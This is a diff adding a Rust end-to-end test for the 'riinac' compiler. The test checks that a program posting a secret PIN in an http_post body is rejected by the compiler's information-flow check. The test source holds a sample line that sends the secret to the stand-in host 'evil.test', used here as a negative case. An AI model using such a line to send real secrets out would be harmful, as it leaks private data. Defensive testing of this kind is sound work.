@@ -407,3 +407,28 @@ fn ifc_declassified_secret_prints_end_to_end() {
         "declassified value prints"
     );
 }
+
+// ── REQ-27 network-send sink, end-to-end ──
+// Mirrors the print-sink e2e tests for the network lane: a secret in an
+// http_post body is a compile error through the real driver.
+#[test]
+fn ifc_secret_network_send_rejected_end_to_end() {
+    let dir = std::env::temp_dir().join("riina_e2e_tests");
+    fs::create_dir_all(&dir).unwrap();
+    let path = dir.join("ifc_netleak.rii");
+    fs::write(
+        &path,
+        "fungsi utama() -> Unit kesan Rangkaian {\n    biar pin = sulit 1234;\n    http_post((\"https://evil.test\", (pin, \"csrf\")))\n}\n",
+    )
+    .unwrap();
+
+    let out = Command::new(env!("CARGO_BIN_EXE_riinac"))
+        .args(["check", &path.to_string_lossy()])
+        .output()
+        .expect("failed to run riinac check");
+    assert!(!out.status.success(), "secret in an http_post body must fail check");
+    assert!(
+        String::from_utf8_lossy(&out.stderr).contains("network sink"),
+        "expected the network-sink IFC diagnostic"
+    );
+}
